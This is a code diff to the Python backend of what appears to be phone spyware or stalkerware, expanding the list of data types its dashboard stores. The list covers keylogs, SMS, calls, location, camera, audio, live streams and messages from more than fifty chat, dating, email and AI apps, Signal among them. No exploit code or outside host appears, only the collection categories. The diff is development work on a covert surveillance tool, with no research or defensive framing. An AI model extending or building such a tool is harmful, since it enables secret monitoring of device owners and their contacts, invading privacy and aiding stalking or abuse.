@@ -6,15 +6,27 @@ from datetime import datetime
 DB_PATH = os.environ.get("DB_PATH", "smilex.db")
 
 # All known data types (for filtering in dashboard)
+# Expanded to include all 50+ IM apps from IMReaderModule
 DATA_TYPES = [
+    # Core data types
     "sms", "call", "location", "contact", "notification",
     "accessibility", "keylog",
-    "im", "im_whatsapp", "im_telegram", "im_instagram",
-    "im_facebook", "im_viber", "im_skype", "im_vk",
-    "im_gmail", "im_deepseek", "im_grok",
+    # IM / Messaging apps
+    "im", "im_whatsapp", "im_telegram", "im_signal", "im_instagram",
+    "im_facebook", "im_viber", "im_skype", "im_vk", "im_discord",
+    "im_line", "im_kakaotalk", "im_bbm", "im_wechat", "im_weibo",
+    "im_snapchat", "im_tinder", "im_tumblr", "im_twitter", "im_tiktok",
+    "im_reddit", "im_textme", "im_kik", "im_threema", "im_zalo",
+    "im_muzmatch", "im_imo", "im_wamba", "im_waplog", "im_boo",
+    "im_mamba", "im_gostinder", "im_okru", "im_oneme", "im_skylove",
+    "im_hangouts", "im_gmail", "im_outlook", "im_bluemail", "im_yandexmail",
+    "im_deepseek", "im_chatgpt", "im_grok", "im_perplexity", "im_scaleup",
+    "im_alice", "im_teams", "im_meet", "im_googlechat",
+    # Calendar & Browser
     "calendar", "browser_history", "browser_url",
-    "app_usage", "device_info", "files", "clipboard",
-    "screencap", "camera", "audio", "livestream",
+    # Device & System
+    "app_usage", "app_install", "device_info", "files", "clipboard",
+    "screencap", "screenshot", "camera", "audio", "livestream",
     "battery", "sim", "network",
 ]
 
